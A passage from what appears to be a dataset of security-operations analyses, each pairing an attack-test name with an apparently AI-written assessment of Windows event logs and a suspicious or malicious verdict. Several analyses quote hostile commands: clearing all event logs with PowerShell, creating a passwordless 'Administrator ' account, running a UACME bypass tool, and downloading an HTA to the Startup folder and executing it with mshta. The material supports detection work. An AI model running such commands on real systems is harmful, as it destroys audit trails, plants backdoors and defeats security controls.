   - Perform in-depth analysis of user activity (`admin_test`) to determine if the account was compromised or abused.

3. **Remediation**:
   - Revert the permissions created by `icacls` where feasible and assess system integrity.  
   - Reset credentials for `admin_test` and any other accounts potentially impacted.

4. **Documentation**:
   - Document findings and events observed in detailed incident report for future reference and process improvements.

5. **Monitoring**:
   - Enhance monitoring and alerting mechanisms on process creation, command-line arguments, and access permissions, especially for high-risk users and assets."
Activate Windows NoTrayContextMenu Group Policy Feature,"**Detailed Analysis:**

The logs provided primarily consist of Sysmon logs, with events capturing process creations and terminations on the Windows host. Here is a breakdown of the analysis based on patterns observed in the Sysmon log entries:

1. **Wevtutil.exe Process Execution:**

   - Multiple instances of the `wevtutil.exe` program are executed in quick succession. While `wevtutil.exe` is a legitimate Windows utility for managing event logs, frequent or scripted invocations could denote log tampering or clearing activities sometimes used by attackers.
   - However, without visibility into the command-line arguments used with `wevtutil.exe`, we cannot definitively classify it as malicious but its unusual frequency under the same user merits further exploration.

2. **Registry Modification via cmd.exe:**

   - **EventID 17977:** `cmd.exe` is executed with command-line arguments indicating a registry modification. The command modifies a policy setting in the registry (`HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`) using `reg.exe` to suppress the tray context menu.
   - This alteration is suspicious as it could signify an attempt to restrict user interactions with the system, typically a tactic to hinder normal user operations or hide certain functionalities. 

3. **Use of Hostname.exe and Whoami.exe:**

   - Instances of `hostname.exe` and `whoami.exe` being executed are observed. `whoami.exe` is often utilized by attackers post-exploitation to gather information about the currently logged on user and their permissions. This alone isn’t inherently malicious but could correlate with suspicious activities when found alongside confirmed malicious actions.

4. **MicrosoftEdgeUpdate.exe Processes:**

   - Multiple instances of `MicrosoftEdgeUpdate.exe` and its related executables are observed. While it is standard for background updates, the volume and rapid sequence of these events would benefit from validation against expected or scheduled updates to rule out exploitation of these services by a malicious entity or potential tampering.

5. **Time Changes in System and Security Logs:**

   - There are multiple entries for time adjustment on the system. While this is generally normal behavior corresponding with NTP time synchronization, if occurring unusually or without explanation, it might indicate an attempt to manipulate timestamp data to cover tracks.

**Assessment:**
- **Suspicious Activity:** The frequent invocation of `wevtutil.exe`, registry modification through `cmd.exe`, alongside utility and process executions indicative of information gathering, suggest activities that warrant closer scrutiny.

**Resolution: SUSPICIOUS:**
- **Recommendation:** Further investigation and monitoring are needed, specifically regarding the reasoning for the script-like behavior of `wevtutil.exe`, registry changes such as suppression of the tray menu, and to confirm the legitimacy of Edge Updates. Engaging with the user associated (SERVER002\admin_test) and gaining more contextual information about recent activities would aid in ruling out an insider threat or unauthorized access. Additionally, cross-referencing these events with network logs or any alerts generated by an EDR would enhance visibility into external communication attempts or exploit indicators, potentially corroborating a threat actor's presence or activity."
Uninstall Crowdstrike Falcon on Windows,"Upon analyzing the provided Windows event logs, several key observations and assessments are as follows:

### Suspicious Activities Detected:

1. **PowerShell Execution**:
   - There are multiple PowerShell events indicating execution of scripts located in ""C:\ProgramData\Package Cache"". This script appears to be trying to repair/uninstall ""WindowsSensor.exe"" quietly if it is a valid signature by ""CrowdStrike, Inc."". The nature of this operation can be suspicious as it suggests possible tampering with a security product and may indicate a removal or tampering attempt.

2. **Security Log Events**:
   - Multiple `EventID: 4672` indicate that a user was assigned special privileges, including `SeDebugPrivilege`. This can be used for malicious purposes as it allows processes to read and tamper with other processes in the system.
   - Event `5379` reoccurs frequently with failed credential access attempts on accounts like ""MicrosoftAccount:user=02txoixylodcstop"". Multiple failures in reading such sensitive credentials can indicate a reconnaissance or brute force attack.

3. **Sysmon Logs**:
   - The execution of Windows utilities like `wevtutil.exe` and `conhost.exe` by ""SERVER002\\admin_test"" can hint at scripts being executed in the background, potentially of malicious intent.
   - Unusual process command line activity and the high number of parent processes having command-line operations could be indicative of script or command execution activity trying to evade detection.

4. **Service and Process Management Logs**:
   - Regular service and process launch events can be observed; however, the volume and regularity of these might suggest a batch job or automated script execution. Particularly, taskhostw.exe frequently initiates or involves multiple user accounts in a short span.
   
5. **Credential Check Failures**:
   - Multiple logs of failed credential requests against accounts like ""MicrosoftAccount:user=02txoixylodcstop."" The non-standard, repetitious activity could be an indication of an attempt to exploit or brute-force account details.

### Assessment and Guidance:

- **Assessment**: Based on the analysis, there are multiple instances of suspicious activities that indicate potential compromise. The unauthorized or repetitive use of privilege escalation, credential access attempts, and PowerShell scripts modifying or unloading security tools without direct context indicate possible malicious activity.

- **Resolution**: **SUSPICIOUS**. The logs contain activity that doesn't look right and needs more investigation to determine if there's an actual compromise or malicious intent.

### Recommended Actions:

1. **Immediate Environment Review**: Conduct an audit of the server's security configuration and running services to ascertain no unauthorized changes have occurred.
   
2. **Trace PowerShell Script Origin**: Investigate how the PowerShell script targeting ""WindowsSensor.exe"" was introduced and verify its legitimacy. This could include looking at the package cache or past activities installing or modifying it.

3. **Monitor Network Traffic**: Set up monitoring for unusual outbound traffic patterns from the system, including DNS requests that could point to command-and-control activity.

4. **User and Account Activity Review**: Scrutinize recent activity logs for all accounts mentioned in the logs to ensure they have not been tampered with and ensure strong authentication measures are in place.

5. **Investigate Failed Credential Attempts**: Understand the relation of ""MicrosoftAccount:user=02txoixylodcstop"" within your network, if applicable. Multiple failed access attempts could indicate ongoing attack activity.

By following these steps, one can more accurately determine if there's active malicious intent related to these observations."
LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell,"### Detailed Analysis of Logs

#### System Logs:
1. **Time Synchronization Events**:
   - There are multiple events related to time changes on the system, specifically Event ID 24 and EventID 1 from ""Microsoft-Windows-Kernel-General"" and EventID 35 from ""Microsoft-Windows-Time-Service"". These indicate that the system clock was adjusted.
   - One particular timestamp shows a backward change in system time which might suggest tampering with system time, potentially by malware to manipulate time-based security controls or logging.

#### PowerShell Logs:
2. **PowerShell Execution**:
   - A PowerShell execution is shown that modifies the registry to disable the privacy experience (`HostApplication=powershell.exe & {New-ItemProperty ..}`).
   - The use of PowerShell to modify registry settings without explicit initiation by an admin is often considered suspicious, especially if the invoked script has no clear purpose aligned with standard operating procedures.

#### Sysmon Logs:
3. **Process Execution**:
   - **Sysmon Event ID 5** logs indicate the frequent use of `wevtutil.exe`, `conhost.exe`, and `hostname.exe`, all executed by the user `SERVER002\admin_test`. While these are legitimate system utilities, excessive or unexpected execution can indicate abuse as part of a broader attack stage.
   - **Sysmon Event ID 1** shows execution of several administrative utilities like `wevtutil.exe`, which can be used for manipulating event logs, possibly to cover tracks.
   - The presence of `MicrosoftEdgeUpdate.exe` and its related components is common and generally associated with legitimate update activities. However, careful validation of their origin would be prudent.

4. **Important Observations**:
   - The `whoami.exe` and `hostname.exe` processes are executed, likely for reconnaissance activities or for confirming current user/system status.
   - The processes are executed with high integrity levels, suggesting administrative privileges have been achieved.

#### Application Logs:
5. **Edge Update Activity**:
   - There are records of `Microsoft Edge Update` activities. These may relate to legitimate browser or system updates.
   - No anomalies are detected here, assuming updates are legitimate and expected.

#### Security Logs:
6. **Security Time Change**:
   - Time changes reflected in Security Event ID 4616 can be correlated with system logs for time change indications. These confirm the system time adjustments were recognized by the security audit logs.

### Assessment & Resolution

Based on the log analyses:
- The suspicious PowerShell command executed to manipulate registry keys without a known legitimate purpose indicates potential attempts to alter system state covertly.
- The time change abnormalities could be part of malicious actions aimed at defeating log integrity or time-based controls.
  
### Conclusion

**Resolution: SUSPICIOUS**

- The events described align with behavior that is abnormal and requires further investigation to confirm intentions, especially the registry modifications via PowerShell and the system time changes.
- It’s recommended to:
  - Verify if the PowerShell command was executed intentionally by a trusted user.
  - Check for potential signs of privilege escalation or unauthorized access to Admin accounts.
  - Investigate the source of system time changes and verify their legitimacy.
  - Conduct a comprehensive security audit and system integrity check.
- Engaging an Incident Response team may be prudent for deeper forensic analysis and ensuring system safety."
Delete System Logs Using Clear-EventLog,"In analyzing the provided Windows event logs from the CEO machine, I have focused on identifying suspicious behavior patterns, such as unusual process executions, command-line arguments, and any signs of potential system compromise.

### Analysis Summary:

1. **Time Manipulation:**
   - **System Log (EventID 1 & 24)** shows the time being set back by the process `svchost.exe`. This kind of alteration, especially when done maliciously, can obscure time-based logs and make detection of suspicious activities challenging. However, without additional suspicious indicators from the same time frame, this alone may not be conclusively malicious.

2. **Sysmon Logs:**
   - There are logs of the execution of typical administrative commands (`whoami.exe`, `hostname.exe`, and `wevtutil.exe`). Usage of these commands could hint at enumeration activity. However, the presence of `whoami.exe` and `hostname.exe` alone is not immediately suspicious, as they often get used during legitimate administrative tasks.
   - **Suspicious PowerShell Activity:** A notable event is a `PowerShell` execution with the command to clear event logs: `powershell.exe & {$logs = Get-EventLog -List | ForEach-Object {$_.Log}, $logs | ForEach-Object {Clear-EventLog -LogName $_ }, Get-EventLog -list}`. The clearing of event logs is a strong indicator of malicious activity, as attackers often perform this to hide their tracks post-exploitation.
   - A variety of processes related to Microsoft Edge update, such as `MicrosoftEdgeUpdate.exe` and `MicrosoftEdgeUpdateComRegisterShell64.exe`, along with certain command-line activities that are typical for update processes, are logged. These appear mundane and typical for scheduled update operations.

3. **Application Log Events:**
   - The logs primarily capture the stopping and starting of services such as EdgeUpdate. The EdgeUpdate service activities align with normal software update functions and don’t present immediate red flags.

4. **Security Log:**
   - Events show time change activities by `svchost.exe`, which aligns with the System Log findings. These changes correspond with typical system activities unless identified during an unusual context or unauthorized user session.

### Assessment and Resolution:
Based on the analysis:

- **Time manipulation** via `svchost.exe` could potentially indicate an attempt to obscure activities, but without more corroborating evidence from other logs, it remains a mild concern.
- **The use of PowerShell to clear event logs** is concerning, as it is a known technique used by attackers to avoid detection.
- **Microsoft EdgeUpdate activities** appear normal based on typical software update operations.

**Final Resolution: MALICIOUS**

The key indicator that leads to this conclusion is the PowerShell command identified, aimed at clearing the event logs, which is a strong indicator of malicious intent. This activity warrants immediate investigation to determine the full scope of the compromise and prevent any potential breach.

### Recommendations for Further Actions:

1. **Immediate Containment and Isolation:**
   - Isolate the CEO’s machine from the network to prevent further activity.
   
2. **Forensic Investigation:**
   - Conduct a deep forensic analysis on the machine to uncover further malicious activities and identify the initial access vector.

3. **Review Access Logs:**
   - Check network access and any external connections initiated from the host during the timeframe in question.

4. **Audit and Patch System:**
   - Update and patch vulnerable applications and close exploitable pathways.
   - Ensure robust monitoring is in place to detect similar activities across other endpoints. 

5. **Incident Response:**
   - Trigger an incident response plan to ensure a coordinated and thorough remediation effort, addressing the clearing of logs and any discovered actor footprint."
Create an Administratoruser (with a space on the end),"### Detailed Analysis of the Logs

#### Suspicious or Anomalous Behaviors:

1. **Repetitive Use of `wevtutil.exe` and `conhost.exe` Processes**:
   - The `wevtutil.exe` process is frequently executed interleaved with `conhost.exe`. This could indicate a script or automation is trying to access or manipulate the event logs. While these processes are legitimate Windows components, abnormal and repeated invocation with unspecified commands can be indicative of malicious scripting.

2. **PowerShell Activity**:
   - There is an execution of `PowerShell.exe` with a suspicious command line: `powershell.exe & {New-LocalUser -Name \""Administrator \"" -NoPassword}`. This strongly suggests unauthorized user creation, and the lack of a password makes this extremely alarming.

3. **Time Change Events**:
   - The `Windows time` was modified as evidenced by Event ID 4616 in the security logs. Time changes can be used by attackers to obscure the true sequence of events or bypass scheduled tasks and is generally suspicious unless justified by legitimate administration.

4. **Security Logs Indicating User Creation**:
   - Security events log the creation of a user named `Administrator ` (note the suspicious trailing space) by the user `admin_test`. Events 4720 and 4722 confirm the creation and enabling of this account, which is executed without an apparent legitimate reason.

5. **Group Membership Modification**:
   - There’s an entry indicating a modification of group membership for the `Administrator ` account, which could be an intentional attempt to escalate privileges.

6. **Edge Update Processes**:
   - Numerous processes related to `Microsoft Edge Update` suggest a legitimate update process is occurring. However, these are primarily seen running under the `NT AUTHORITY\SYSTEM` account, making it less likely to be an issue but still worth verifying that the update files themselves are legitimate to rule out a potential masquerading tactic.

#### Malicious Activities or Compromise Indicators:

- **Unauthorized Account Creation**:
  - The PowerShell command to create an administrator account without a password, alongside the security events confirming this action, is a clear indicator of an unauthorized attempt to establish persistent access with high privileges.

- **Potential Privilege Escalation**:
  - Modifying group memberships and creating unnamed/suspicious accounts is a tactic often used by attackers to escalate privileges and maintain control over a compromised system.

#### Guidance and Recommendations:

1. **Immediate Containment**:
   - Disable the unauthorized `Administrator ` account and change the password for any accounts potentially compromised (especially `admin_test`).

2. **Investigate and Audit**:
   - Thoroughly investigate the script that executed the PowerShell command, which suggests checking for scheduled tasks or scripts that may have been left by an attacker.

3. **System Time Correction**:
   - Verify and correct the system time if it was altered without authorization, and review for consistency with other logs.

4. **Enhance Monitoring**:
   - Increase monitoring for suspicious `PowerShell.exe`, `wevtutil.exe`, and `conhost.exe` activities, specifically looking for anomalies in command lines and user context in which they are executed.

5. **Review Edge Update Execution**:
   - Validate that Edge Update files and processes are genuine, ensuring the updates are from a legitimate source.

### Final Resolution:
- **MALICIOUS**: The logs provide clear evidence of malicious activity, primarily the unauthorized creation of an administrator account through PowerShell with malicious intent expected. Prompt containment and further investigation are crucial."
Masquerade as a built-in system executable,"## Analysis and Findings

The Windows event logs provided reveal several key points that require investigation. Below is a detailed breakdown of suspicious and potentially malicious activities identified in the given logs:

### Windows PowerShell log

1. **Suspicious PowerShell Activity:**
   - A PowerShell script initiated the process `svchost.exe` from the path `C:\Windows\Temp\svchost.exe`. The script leverages `Add-Type` to compile code and subsequently execute the compiled code by starting a new process.
   - The creation and execution of an executable in the temporary directory using PowerShell and non-standard paths are uncommon and may suggest an attempt to execute unauthorized code.

2. **Indicators of Potential Exploitation:**
   - The script content logs suggest a C# code compilation using PowerShell, which is indicative of a fileless malware delivery or persistence mechanism. Attackers might leverage such methods to execute payloads without detection by circumventing traditional security measures.

### Sysmon log

1. **Process Execution and Parent-Child Relationships:**
   - `powershell.exe` spawned `C:\Windows\Temp\svchost.exe`, which is atypical considering that legitimate `svchost.exe` processes should be running from the `C:\Windows\System32` directory. This discrepancy suggests potential masquerading where malicious software is mimicking a legitimate Windows process.
   - The parent-child configuration of PowerShell executing compiled .NET assemblies further suggests attempts to execute specific payloads.

2. **Other System Activities:**
   - Legitimate Windows processes such as `wuauclt.exe` and processes associated with Microsoft updates (e.g., `AM_Delta.exe`) appear as expected, suggesting routine system updates and malware signature updates by Windows Defender.
  
### Security & System logs

1. **Security and Update Events:**
   - No direct correlation with typical malicious login attempts or privilege escalation, but the event logs showing compiled code execution and PowerShell scripting still remain suspicious.

### Application log

1. **Windows Defender Status:**
   - The log shows Windows Defender is active and running, however, if the suspicious activities found are indeed malicious, the security solution might have been bypassed temporarily by an advanced technique.

## Assessment

The suspicious PowerShell activity and execution of non-standard svchost.exe raise significant concerns of potential malicious behavior. The use of `Add-Type` in PowerShell for compiling and executing code is typical for advanced persistent threats aiming for stealth execution.

## Resolution

**Resolution: SUSPICIOUS**

The current findings suggest that the behavior observed is anomalous and potentially indicative of malicious activity that warrants further investigation. There is a need to determine the origin of the suspicious PowerShell script execution and its implications.

### Recommended Actions:

1. **Immediate Investigation:**
   - Isolate the affected machine to prevent potential spread or further execution of malicious code.
   - Perform a deeper investigation of the source of PowerShell script execution, including reviewing associated user activities and changes.

2. **System Integrity Checks:**
   - Verify the integrity of the Windows `svchost.exe` files and ensure no unauthorized modifications exist in system directories.

3. **Evaluate Suspicious Files:**
   - Analyze the compiled executable `C:\Windows\Temp\svchost.exe` to identify its purpose and contents using static or dynamic analysis tools.

4. **Enhanced Monitoring:**
   - Set up additional threat detections and enhance PowerShell logging to capture future anomalous behavior.

5. **User Training and Awareness:**
   - Educate staff, especially on privileged accounts, about the risks and methods used in targeted attacks, including the use of PowerShell for illegitimate activities.

By following these steps, further clarity on the nature of this suspicious event can be achieved, mitigating potential risks to the organization's operations and data integrity."
Event Viewer Registry Modification - Redirection Program,"### Analysis of Windows Event Logs:

#### Suspicious or Anomalous Behavior:

1. **Time Change Events**:
   - The `Security` and `System` logs show multiple entries for Event ID `4616`, indicating a change in the system time. The system time was set backward, which can indicate an attempt to evade detection or create backdoors.
   - A legitimate service process, `svchost.exe`, is involved, but frequent time adjustments are often used in malicious activities to avoid log overlap and confuse event timelines.

2. **Registry Modification**:
   - A `cmd.exe` process executed a command to modify the registry at `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Event Viewer` for `MicrosoftRedirectionProgram`. This replaces the Event Viewer application with `notepad.exe`.
   - Such registry changes can be used to hide malicious actions by preventing users or admins from viewing event logs directly through standard tools.

3. **Frequent Execution of `wevtutil.exe`**:
   - The use of `wevtutil.exe` is typically associated with event log-related actions, such as clearing or modifying event logs. The multiple sequential executions of `wevtutil.exe` by `admin_test` without known legitimate reasons could potentially indicate an attempt to cover tracks.

4. **Execution of Command-Line Tools**:
   - Execution of system tools such as `hostname.exe`, `whoami.exe`, and direct manipulations with `cmd.exe` and `reg.exe` within a short time frame may suggest privilege recon or escalated compromises on the system.

5. **Privileged Logon Sessions**:
   - Multiple high-integrity level sessions initiated by `admin_test` with several privileges (`SeSecurityPrivilege`, `SeDebugPrivilege`, etc.) were noted. While `admin_test` could legitimately require high privileges, the timing and context of the operations can be suspicious.

#### Indicators of Malicious Activity:

- **Registry alteration by `cmd.exe`**: Command line alterations to registry entries targeting event viewer redirection are a known technique for obfuscating activities by preventing real-time log inspection.
  
- **Time manipulation**: The tampering with system times can be highly indicative of illicit behavior, especially when paired with other suspicious activities within the same timeframe.

#### Assessment:

Based on the nature of these events, especially the registry modification without a legitimate business context and the time manipulation activities, there are strong indicators of potentially malicious activity or ongoing compromise.

#### Guidance:

1. **Immediate Investigation**:
   - Conduct a thorough review of the `admin_test` account's activities, including login history and permissions.
   - Enforce logging integrity by assessing configured log forwarding and stored backups to ensure no data has been lost.

2. **Registry and Configuration Review**:
   - Inspect the modified registry keys to validate and, if necessary, revert unauthorized changes.
   - Check other critical system settings and configurations that might have been altered maliciously.

3. **System-Wide Security Audit**:
   - Initiate an extensive audit of user behaviors and historical log data for similar signs or other compromised accounts.
   
4. **Increasing Monitoring and Alerting**:
   - Enhance the security posture with updated alerts for similar activities and monitor for correlated event patterns.

### Resolution:
**MALICIOUS** - The logs contain activity that strongly suggests malicious actions likely geared towards hiding other unauthorized or malicious operations on the host. Immediate incident response actions are recommended."
UACME Bypass Method 34,"Based on the provided event logs, the investigation reveals the following:

### Detailed Analysis:
1. **Unusual Execution of `cmd.exe`:**
   - The Sysmon logs show an execution of `cmd.exe` with a specific command line argument: `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\\Externalfiles\\uacme\\34 Akagi64.exe`. This is highly suspicious as it relates to UACME, which is a known tool for bypassing User Account Control (UAC) in Windows systems. The execution context is associated with a user `admin_test` which further suggests potential misuse of administrative privileges.

2. **Chain of Execution:**
   - There is a sequence of `cmd.exe`, `powershell.exe`, and `conhost.exe` executions, all tied to the `admin_test` user, suggesting that an automated script or a PowerShell script could be leveraging these processes for potentially unauthorized activities.

3. **Execution of `wevtutil.exe`:**
   - The execution of `wevtutil.exe` under the same user (`admin_test`) raises concerns as `wevtutil.exe` is commonly used for managing Windows event logs which could be a tactic to clear or tamper with logs to cover tracks of malicious activity.

4. **Edge Update Activity:**
   - Multiple entries show the execution of `MicrosoftEdgeUpdate.exe` and related processes under `NT AUTHORITY\SYSTEM`. Although this could be routine software update operations, the presence of temporary files (`EU9437.tmp`) and numerous executions in a very short time frame could indicate unusual activity.

5. **Command Execution Integrity Level:**
   - Many of the processes executed under the `admin_test` user have a high integrity level, indicating they are operating with elevated privileges, which might be leveraged for malicious purposes if not authorized.

### Assessment Summary:
- **Indicators of Compromise:**
  - Execution of UACME tool suggests attempts to bypass Windows security features.
  - Use of `wevtutil.exe` could be related to efforts to manipulate event logs.
  - Elevated privilege and suspicious command-line arguments are typically associated with malicious behaviors, such as privilege escalation or installation of unauthorized software.

### Resolution: MALICIOUS
After analyzing the activities in the logs, there is a clear indication of malicious behavior. The presence and execution of the UAC bypass tool `uacme\\34 Akagi64.exe`, combined with the sequential use of system utilities in a short time span by an administrative user, strongly suggests an attempt to compromise the system's security. Immediate action is recommended to mitigate any potential threat:

### Guidance on How to Proceed:

4. **Enhanced Monitoring:**
   - Enable enhanced monitoring and logging on the affected system and similar systems in the network to detect any repeated or anomalous behavior.

5. **Incident Report:**
   - Document the findings and steps taken, and escalate the issue to the Incident Response Team for broader analysis and communication within the organization. 

By following these steps, the organization can mitigate the immediate risk and enhance its security posture to better protect against similar threats in the future."
Execution of program.exe as service with unquoted service path,"To analyze the provided Windows event logs, we'll focus on identifying any suspicious or malicious behavior by considering unusual process executions, command-line arguments, privilege escalations, and other potential signs of compromise. Here is a detailed analysis:

### Analysis Summary:

1. **Security log analysis:**
   - The events (EventID 4616) recorded here pertain to system time changes via the `svchost.exe` process running under `LOCAL SERVICE`. This is typically benign and might indicate synchronization with an external time server.

2. **Sysmon log analysis:**
   - Multiple processes, such as `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, and `cmd.exe`, were executed by the user `SERVER002\admin_test` (EventID 1 and 5).
   - Particular attention is needed for `cmd.exe`'s command-line activity, which includes:
     - Copying `WindowsServiceExample.exe` to `C:\Program Files\windows_service.exe` and `C:\program.exe`.
     - Using `sc.exe` to create a new service named ""Example Service"" with a `start= auto`.
     - Starting the ""Example Service"".
   - The service creation and start by a user process are potential indicators of privilege escalation or persistence techniques.

3. **System log analysis:**
   - The Service Control Manager (EventID 7045) logs the creation of the ""Example Service"", which aligns with the `cmd.exe` activity.
   - The subsequent event (EventID 7000) indicates a potential issue starting the service, denoted by `param2=""%%2""`, translating to an error such as ""The system cannot find the file specified.""

### Assessment:

- The execution of processes such as `cmd.exe` and `sc.exe` for creating and starting services suggests potentially unauthorized modifications that align with persistence techniques commonly used by malicious actors. The command executed by `cmd.exe` and the characteristics of the created service suggest an attempt to persist a potentially malicious executable as a legitimate service.
- Such activity is not typical for a standard user and is indicative of potential malicious activity and system compromise. The failure to start implies incomplete deployment or an error in the attack execution.

### Guidance on How to Proceed:

- **Resolution:** MALICIOUS
- **Suggested Actions:**
  1. **Containment:** Immediately isolate Server002 from the network to prevent further potential spread or damage by the suspicious service.
  2. **Remediation:** Conduct a thorough investigation into the source and nature of the executable `WindowsServiceExample.exe` and the commands executed.
  3. **Forensic Review:** Analyze system changes and inspect related artifacts, such as other command and control configurations or additional malicious payloads.

  5. **Notify:** Inform the executive and IT security teams to stay vigilant and initiate awareness training for spotting social engineering tactics and phishing attempts.

These steps will help to ensure that any malicious activity is eradicated and further occurrences are prevented."
Kill Event Log Service Threads,"### Analysis of Windows Event Logs:

The logs provided contain entries from multiple sources, including the System, Sysmon, Windows PowerShell, Security, and Application logs. Below is a detailed analysis of these logs to determine potential signs of malicious activity.

#### Key Observations:

1. **Time Manipulation Events**:
   - Multiple `Kernel-General` and `Security Audit` logs indicate changes in the system time (`EventID: 24` and `EventID: 4616`). This is often a suspicious activity since it can be used to evade time-based security controls and logs.

2. **PowerShell Activity**:
   - There are several PowerShell logs (`EventID: 600` and `400`) showcasing a script execution to download and run `Invoke-Phant0m.ps1` from a GitHub URL. This script is a known malware RiskTool constructed to kill Windows Event Logs, a behavior typical in advanced malware tactics to hide malicious activities.

3. **Suspicious Process Creation**:
   - Sysmon logs capture the execution of `whoami.exe`, `hostname.exe`, and `wevtutil.exe` under the `SERVER002\admin_test` user, which may indicate reconnaissance or manipulation attempts.
   - The execution of `wevtutil.exe` is often associated with log clearance, pointing to potential obfuscation attempts.

4. **Privilege Escalation**:
   - The `Security` log (`EventID: 4672`) indicates that the user `admin_test` has been granted a wide array of privileges, including `SeDebugPrivilege`, which allows for debugging of processes, often exploited for privilege escalation or sensitive information access.

5. **Network Connection from Unusual IP**:
   - The `Security` log indicates a logon (`EventID: 4624`) from an IP address `fe80::e3b5:5371:12a8:9c77`. While this could be a legitimate connection if from an internal network, its association with potentially malicious activities necessitates further investigation.

6. **Script Execution Behavior**:
   - The PowerShell command line modifies the execution policy and downloads a script from an external source without verification, which is a red flag. The script `Invoke-Phant0m.ps1` is being imported and executed, known to interact with system logging.

7. **Defender Monitoring**:
   - Windows Defender appears to be on and presumably monitoring; however, there is no specific indication that it has detected or blocked any threats, which could suggest successful evasion tactics by the attacker.

### Assessment of Malicious Activity:

Combining all observations from the logs, there are multiple red flags indicating malicious activity. The key indicator is the execution of `Invoke-Phant0m.ps1`, a tool used by attackers to make detection and subsequent investigations difficult by stopping logging services.

### Resolution:

**MALICIOUS** - The logs contain evidence of malicious activity initiated by PowerShell scripts and system time manipulation. Immediate actions should be taken to contain the threat, investigate the depth of compromise, and prevent further unauthorized actions on the network.

By following these steps, the organization can help mitigate the current threat and prevent similar occurrences in the future."
Msiexec.exe - Execute Local MSI file with an embedded DLL,"Upon review of the provided Windows event logs, certain activities in the log entries appear concerning and could potentially indicate malicious activities.

### Suspicious Findings:
1. **Unusual Process Activities with PowerShell**:
   - The execution of `powershell.exe` with the command-line argument `-nop -Command Write-Host CustomAction export executed me; exit` raises suspicion. This kind of usage with the `-nop` (No Profile) flag can often indicate attempts to evade detection and is commonly associated with malicious activities.
   - The PowerShell `HostApplication` logs further confirm that this specific file was invoked with the `-nop` flag, indicating an attempt to run scripts without loading a user profile. This is typically seen in malicious scripts that attempt to minimize detection.

2. **Use of msiexec.exe to Install an MSI**:
   - There is evidence of `msiexec.exe` being used to silently install a "".msi"" file (`data.007_DLL.msi`) located in a user's temp directory. This is performed with the `/q` flag for quiet install and could be an indicator of a non-legitimate software installation.
   - The MSI installation events (`EventID` 1040 and 11707 from `MsiInstaller`) follow this, recording the installation of ""file Test Installer"" with 6868 process ID, indicating silent installation activity attributed to `msiexec.exe`.

3. **Frequent Usage of conhost.exe**:
   - `conhost.exe` instances appear frequently alongside command-line executions. While this can be normal behavior for providing command-line interfaces, when coupled with suspicious PowerShell usage, it can point to attempts at executing commands stealthily.

### Evaluation:
- The execution of PowerShell in such a manner, accompanied by the invocation of silent MSI installations, is abnormal, and these correlations suggest that activities on the system do not align with standard operational behavior. This raises concern as PowerShell is a powerful scripting platform that can be exploited for various attack vectors, particularly for reconnaissance or execution of malicious payloads.
- The msi installation originating from a temp directory with an unknown source further hints at potential malware distribution.

### Conclusion:
Given the evidence of potential script execution aimed at evading detection alongside suspicious software installation activities, the windows host logs contain activities that are considered SUSPICIOUS. Although there isn't undeniable proof of malicious intent, these activities are atypical and require a more in-depth investigation.

### Guidance:
- **Immediate Next Steps**:
  - Isolate the system for further forensic investigation.
  - Conduct a detailed threat hunting exercise on the PowerShell and msiexec logs, focusing on any potential C2 (Command & Control) communication or further script executions.
  - Analyze the `.msi` files in question to determine their origin and possible payloads.
  - Validate changes to the system state against integrity baselines to spot unauthorized modifications.

- **Remediation and Monitoring**:
  - Strengthen monitoring on PowerShell executions, especially using non-interactive flags.
  - Employ PowerShell logging and script block logging to ensure detailed visibility on scripting activities.
  - Ensure antivirus and endpoint detection solutions are updated to detect known malicious patterns associated with the observed behavior.

- **User Awareness and Training**:
  - Educate users on safe installation practices and the risks associated with executing scripts or software from untrusted sources.

Final Resolution: **SUSPICIOUS** - Further investigation necessary."
Mshta Executes Remote HTML Application (HTA),"Upon reviewing the provided Windows event logs, several indicators suggest potential malicious activity on the system, particularly involving the PowerShell logs:

1. **Suspicious PowerShell Commands**: 
   - The logs show repeated execution of a particular PowerShell script that retrieves a file from a GitHub URL (`https://raw.githubusercontent.com/file/file-file/master/files/data.005/src/data.005.hta`), saves it to the user's startup folder (`$env:appdata\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\data.005.hta`), and then executes it using `mshta`. This behavior is commonly associated with malicious scripts attempting persistence by ensuring execution on startup.
   - Furthermore, the script issues a `start-sleep` and a `stop-process` command targeting ""calculator,"" which suggests potential obfuscation or attempts to evade detection.

2. **Use of `mshta.exe`**:
   - The execution of `mshta.exe` with the downloaded `.hta` file is particularly concerning. `mshta.exe` is often used by attackers to execute malicious scripts in a seemingly benign manner, leveraging it to evade detection mechanisms.

3. **Command Execution and Process Creation**:
   - The Sysmon logs corroborate the PowerShell log findings by showing the process creation linked to these events. Specifically, it documents the launch of `mshta.exe` to run the potentially malicious HTA file, as well as the `cmd.exe` processes spawned by this chain of events.
   - There is a notable derivative process chain involving `calc.exe`, which may be a red herring or part of process injection, or an indicator of failed execution of the intended payload.

4. **Other Logs**: 
   - The other logs such as Application, System, and Security logs do not provide additional evidence of malicious activity beyond the unusual process and command execution mentioned above.

### Assessment:
The behavior observed in these logs, particularly the sequence of using PowerShell to download and execute a script via `mshta.exe`, heavily indicates malicious intent. This pattern is commonly associated with phishing attacks or malware aimed at maintaining persistence and further compromising the system. The concurrent use of known living-off-the-land binaries (LOLbins) like `mshta` and PowerShell is a key indicator used for malicious purposes.

### Resolution: MALICIOUS

### Guidance:
1. **Immediate Incident Response**:
   - Isolate the affected system from the network to prevent further spread or communication with the attacker's server.
   - Thoroughly inspect and clean the startup and temporary folders to remove any unauthorized files or scripts.
  
2. **Further Investigation**:
   - Conduct a deeper forensic analysis to determine the full scope of the compromise, including any lateral movements or additional payloads.
   - Identify and analyze any potentially compromised accounts, elevating their privileges or changing credentials as needed.

3. **Remedial Actions**:
   - Enhance monitoring with more comprehensive IOC (Indicator of Compromise) searches based on the discovered script and activities.
   - Educate employees, especially high-profile users like the CEO, on phishing and suspicious activity identification.

This situation requires urgent attention to mitigate any potential damage and to prevent similar occurrences in the future."
Windows - Modify file last access timestamp with PowerShell,"Upon analyzing the provided logs, there are certain elements that suggest potentially suspicious activity on the Windows host in question. Below is the detailed analysis:

### Suspicious or Anomalous Behaviors:
1. **PowerShell Activity:**
   - The PowerShell Event log entries indicate an obfuscated script activity. Notably, the command:
     ```
